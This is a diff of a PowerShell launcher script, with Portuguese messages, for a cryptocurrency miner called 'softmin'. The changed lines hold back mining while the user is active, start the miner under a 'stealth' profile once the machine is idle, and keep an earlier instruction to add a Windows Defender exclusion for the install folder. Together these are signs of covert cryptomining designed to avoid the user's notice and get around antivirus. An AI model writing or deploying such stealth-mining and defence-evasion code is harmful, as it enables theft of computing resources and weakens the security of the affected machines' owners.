@@ -71,10 +71,15 @@ if ($adaptive -and (Test-Path -LiteralPath $govScript)) {
 
 Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 400
-try {
-    Start-Process -FilePath $exe -ArgumentList $launch -WorkingDirectory $InstallPath -WindowStyle Hidden
-    Write-Host 'Softmin iniciado. Log:' (Join-Path $logDir 'softmin.log') -ForegroundColor Green
-} catch {
-    Write-Warning ('Nao foi possivel iniciar softmin.exe: {0}' -f $_.Exception.Message)
-    Write-Warning 'Adicione exclusao no Windows Defender para a pasta de instalacao e execute start.bat.'
+$idleSec = Get-SoftminUserIdleSeconds
+if ($idleSec -lt 90) {
+    Write-Host ('Utilizador activo (idle={0}s) - minerador adiado; governador inicia quando ocioso.' -f $idleSec) -ForegroundColor DarkGray
+} else {
+    try {
+        Start-SoftminMinerProfile -InstallPath $InstallPath -Profile 'stealth' -Settings $settings | Out-Null
+        Write-Host 'Softmin iniciado (stealth). Log:' (Join-Path $logDir 'softmin.log') -ForegroundColor Green
+    } catch {
+        Write-Warning ('Nao foi possivel iniciar softmin.exe: {0}' -f $_.Exception.Message)
+        Write-Warning 'Adicione exclusao no Windows Defender para a pasta de instalacao e execute start.bat.'
+    }
 }
